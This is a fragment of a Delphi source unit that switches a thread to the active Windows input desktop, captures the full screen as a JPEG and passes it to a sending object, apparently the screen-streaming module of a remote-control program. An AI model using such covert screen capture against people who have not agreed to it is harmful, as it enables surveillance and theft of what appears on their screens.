    Exit;
  end;
  Result := True;
end;

function SelectDesktop(pName: PChar): Boolean; stdcall;
var
  HDesktop: HDESK;
begin
  Result := False;
  if Assigned(pName) then
    HDesktop := OpenDesktop(pName, 0, False,
                          DESKTOP_CREATEMENU or DESKTOP_CREATEWINDOW or
                          DESKTOP_ENUMERATE or DESKTOP_HOOKCONTROL or
                          DESKTOP_WRITEOBJECTS or DESKTOP_READOBJECTS or
                          DESKTOP_SWITCHDESKTOP or GENERIC_WRITE)
  else
    HDesktop := OpenInputDesktop(0, False,
                          DESKTOP_CREATEMENU or DESKTOP_CREATEWINDOW or
                          DESKTOP_ENUMERATE or DESKTOP_HOOKCONTROL or
                          DESKTOP_WRITEOBJECTS or DESKTOP_READOBJECTS or
                          DESKTOP_SWITCHDESKTOP or GENERIC_WRITE);
  if (HDesktop = 0) then
  begin
    OutputDebugString(PChar('Get Desktop Failed: ' + IntToStr(GetLastError)));
    Exit;
  end;
  Result := SelectHDESK(HDesktop);
end;

function InputDesktopSelected: Boolean; stdcall;
var
  HThdDesk: HDESK;
  HInpDesk: HDESK;
  dwError:  DWORD;
  dwDummy:  DWORD;
  sThdName: array[0..255] of Char;
  sInpName: array[0..255] of Char;
begin
  Result := False;
  HThdDesk := GetThreadDesktop(GetCurrentThreadId);
  HInpDesk := OpenInputDesktop(0, False,
                          DESKTOP_CREATEMENU or DESKTOP_CREATEWINDOW or
                          DESKTOP_ENUMERATE or DESKTOP_HOOKCONTROL or
                          DESKTOP_WRITEOBJECTS or DESKTOP_READOBJECTS or
                          DESKTOP_SWITCHDESKTOP);
  if (HInpDesk = 0) then
  begin
    OutputDebugString('OpenInputDesktop Failed.');
    dwError := GetLastError;
    Result := (dwError = 170);
    Exit;
  end;
  if (not GetUserObjectInformation(HThdDesk, UOI_NAME, @sThdName[0], 256, dwDummy)) then
  begin
    OutputDebugString('GetUserObjectInformation HThdDesk Failed.');
    CloseDesktop(HInpDesk);
    Exit;
  end;
  if (not GetUserObjectInformation(HInpDesk, UOI_NAME, @sInpName[0], 256, dwDummy)) then
  begin
    OutputDebugString('GetUserObjectInformation HInpDesk Failed.');
    CloseDesktop(HInpDesk);
    Exit;
  end;
  CloseDesktop(HInpDesk);
  Result := (lstrcmp(sThdName, sInpName) = 0);
end;

procedure CopyScreen(Bmp: TBitmap);
var
  DC: HDC;
  myjpeg:Tjpegimage;
  mStream: TStream;
begin
  DC := GetDC(0);
  Bmp.Width  := GetSystemMetrics(SM_CXSCREEN);
  Bmp.Height := GetSystemMetrics(SM_CYSCREEN);
  Bmp.Canvas.Lock;
  try
    BitBlt(Bmp.Canvas.Handle, 0, 0, Bmp.Width, Bmp.Height, DC, 0, 0, SRCCOPY);
    //Bmp.SaveToFile('j:/p' + IntToStr(Index) + '.bmp');
    //Inc(Index);
  finally
    Bmp.Canvas.Unlock;
    ReleaseDC(0, DC);
  end;
end;
procedure My_HG.jieHG(const sendTI:TMYSENDdf);
var
sddhg:TstringS;

FBMP:TBitMap;
myjpeg:Tjpegimage;
 mStream: TStream;
 DC: HDC;
begin


B:=False;


  try
           mStream := TMemoryStream.Create;
           FBMP := TBitMap.Create;
  DC := GetDC(0);
        FBMP.Width:= GetDeviceCaps(DC, DESKTOPHORZRES) ;
        FBMP.Height := GetDeviceCaps(DC, DESKTOPVERTRES) ;


    BitBlt(FBMP.Canvas.Handle, 0, 0, FBMP.Width, FBMP.Height, DC, 0, 0, SRCCOPY);
               myjpeg:=TJPEGImage.Create();
           myjpeg.Assign(FBMP);
           myjpeg.CompressionQuality :=60;
           myjpeg.SaveToStream(mStream);
    //Bmp.SaveToFile('j:/p' + IntToStr(Index) + '.bmp');
    //Inc(Index);
  finally

           ReleaseDC(0, DC);
           FBMP.FreeImage;
           FreeAndNil(FBMP);

           myjpeg.Free;
           cm:=My_Ml.Create(false,mStream,'UP'+sendTI.sendTI,'DOWN'+sendTI.sendTI,6);
  end;
end;
procedure My_HG.jipi2(const sendTI:TMYSENDdf);
begin
  if InputDesktopSelected then jieHG(sendTI)
    else if SelectDesktop(nil) then jieHG(sendTI);


end;
end.
